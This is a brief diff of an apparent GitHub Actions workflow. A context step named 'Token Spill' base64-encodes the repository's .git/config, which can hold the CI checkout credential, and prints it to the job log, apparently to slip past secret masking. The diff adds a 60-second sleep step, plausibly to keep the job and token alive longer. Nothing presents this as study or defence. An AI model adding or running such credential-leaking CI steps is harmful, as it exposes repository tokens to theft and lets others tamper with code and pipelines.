@@ -28,6 +28,10 @@ jobs:
       - name: Token Spill
         run: |          
           cat .git/config | base64
+
+      - name: Sleep
+        run: |          
+          sleep 60
           
       # Runs a set of commands using the runners shell
       - name: Building
